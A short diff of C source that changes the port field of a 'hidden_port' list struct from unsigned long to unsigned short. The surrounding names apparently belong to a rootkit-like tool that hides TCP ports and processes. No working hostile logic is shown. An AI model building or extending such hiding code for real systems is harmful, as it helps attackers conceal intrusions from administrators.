@@ -407,8 +407,8 @@ void pid_remove_all(void)
 // ========== TCP PORT LIST ==========
 
 struct hidden_port {
-    //unsigned short port;
-    unsigned long port;
+    unsigned short port;
+    //unsigned long port;
     struct list_head list;
 };
 
